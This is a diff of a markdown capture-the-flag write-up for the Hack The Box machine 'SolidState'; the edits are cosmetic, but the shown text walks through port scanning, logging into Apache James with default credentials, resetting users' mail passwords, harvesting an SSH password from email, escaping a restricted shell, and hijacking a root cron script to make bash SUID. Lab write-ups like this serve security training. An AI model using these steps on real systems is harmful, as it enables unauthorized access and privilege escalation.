@@ -5,7 +5,7 @@ excerpt: "SolidState is a quick and fun medium box where we're going to exploit 
 date: 2023-01-26
 classes: wide
 header:
-  teaser: /assets/images/htb-writeup-solidstate/logo.png
+  teaser: /assets/images/htb-writeup-solidstate/new.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
@@ -15,13 +15,16 @@ tags:
   - Apache James Server
   - Cron Job
 ---
-![](/assets/images/htb-writeup-solidstate/logo.png)
+
+<p align="center">
+<img src="/assets/images/htb-writeup-solidstate/logo.png">
+</p>
 
 SolidState is a quick and fun medium box where we're going to exploit a vulnerability of the service Apache James after that we're goint to change the credentials of many users of the machine to see through an email from a user of the machine we found credentials to be able to connect via ssh and to be root we have to abuse cron jobs
 
 ## PortScan
 
-```
+```bash
 ❯ nmap -sCV -p22,25,80,110,119,4555 10.10.10.51 -oN targeted
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 13:34 CST
 Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
@@ -61,7 +64,7 @@ Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 The port 4555 have a login but we need credentials  
 
-```
+```bash
 ❯ nc 10.10.10.51 4555
 JAMES Remote Administration Tool 2.3.2
 Please enter your login and password
@@ -74,13 +77,13 @@ I found credentials
 
 Default credentials
 
-```
+```bash
 root:root
 ```
 
 After that we can connect and see the users 
 
-```
+```bash
 listusers
 Existing accounts 5
 user: james
@@ -92,14 +95,14 @@ user: mailadmin
 
 So if we see the webpage of the link  we can change the credentials of the users because we're root 
 
-```
+```bash
 setpassword james james123
 Password for james reset
 ```
 
 We can try with the user james
 
-```
+```bash
 ❯ telnet 10.10.10.51 110
 Trying 10.10.10.51...
 Connected to 10.10.10.51.
@@ -113,7 +116,7 @@ PASS james123
 
 But we don't have nothing
 
-```
+```bash
 HELP
 -ERR
 ?
@@ -125,7 +128,7 @@ LIST
 
 Now change the password of thomas but nothing too 
 
-```
+```bash
 ❯ telnet 10.10.10.51 110
 Trying 10.10.10.51...
 Connected to 10.10.10.51.
@@ -146,7 +149,7 @@ LIST
 
 Now change the password of john 
 
-```
+```bash
 ❯ telnet 10.10.10.51 110
 Trying 10.10.10.51...
 Connected to 10.10.10.51.
@@ -194,7 +197,7 @@ John have information and said mindy have tempory password to login to her accou
 
 Change the password of mindy
 
-```
+```bash
 ❯ telnet 10.10.10.51 110
 Trying 10.10.10.51...
 Connected to 10.10.10.51.
@@ -266,13 +269,13 @@ James
 
 We have the credentials of mindy
 
-```
+```bash
 mindy:P@55W0rd1!2@
 ```
 
 Now we connect via ssh
 
-```
+```bash
 ❯ ssh mindy@10.10.10.51
 The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
 ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
@@ -293,7 +296,7 @@ mindy@solidstate:~$
 
 ## User flag
 
-```
+```bash
 mindy@solidstate:~$ clear
 -rbash: clear: command not found
 mindy@solidstate:~$ echo $PATH
@@ -314,12 +317,12 @@ We have problems is a rbash
 
 We want a bash so we can do this
 
-```
+```bash
 ❯ sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 whoami
 mindy
 ```
 
-```
+```bash
 ❯ sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 bash
 whoami
 mindy
@@ -329,7 +332,7 @@ pwd
 
 That works 
 
-```
+```bash
 ❯ ssh mindy@10.10.10.51 bash
 mindy@10.10.10.51's password: P@55W0rd1!2@
 whaomi
@@ -346,7 +349,7 @@ reset xterm
 
 Now we have a bash
 
-```
+```bash
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ export SHELL=/bin/bash
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ echo $SHELL
 /bin/bash 
@@ -357,7 +360,7 @@ xterm
 
 ## Privilege escalation
 
-```
+```bash
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ find \-perm -4000 2>/dev/null
 ./bin/su
 ./bin/mount
@@ -385,13 +388,13 @@ You can abuse of the pkexec binary but it's not the idea
 
 Export your path 
 
-```
+```bash
 export PATH=yourpath
 ```
 
 And nothing of interest
 
-```
+```bash
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ getcap -r / 2>/dev/null
 /usr/bin/arping = cap_net_raw+ep
 /usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
@@ -403,14 +406,14 @@ Now we can see cron jobs you can use pspy or a bash script
 
 - [Pspy](https://github.com/DominicBreuker/pspy)
 
-```
+```bash
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ touch procmon.sh
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls
 procmon.sh
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x procmon.sh 
 ```
 
-```
+```bash
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat procmon.sh 
 #!/bin/bash
 
@@ -436,7 +439,7 @@ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$
 
 The most interesting thing the script reported is this
 
-```
+```bash
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /opt/tmp.py 
 -rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$
@@ -444,7 +447,7 @@ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$
 
 If you use pspy you have to see that
 
-```
+```bash
 2023/01/26 19:27:01 CMD: UID=0     PID=22630  | /bin/sh -c python /opt/tmp.py 
 2023/01/26 19:27:01 CMD: UID=0     PID=22631  | 
 2023/01/26 19:27:01 CMD: UID=0     PID=22632  | sh -c rm -r /tmp/*  
@@ -453,7 +456,7 @@ If you use pspy you have to see that
 
 Root run the script 
 
-```
+```bash
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat /opt/tmp.py 
 #!/usr/bin/env python
 import os
@@ -469,7 +472,7 @@ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$
 
 The os.system library is imported and is run by root so we can alter that because we have permissions to write the script
 
-```
+```bash
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat /opt/tmp.py 
 #!/usr/bin/env python
 import os
@@ -487,7 +490,7 @@ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$
 
 Now we have to wait the bash to be suid
 
-```
+```bash
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /bin/bash
 -rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$
@@ -495,7 +498,7 @@ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$
 
 ## Root flag
 
-```
+```bash
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ bash -p
 bash-4.4# whoami
 root
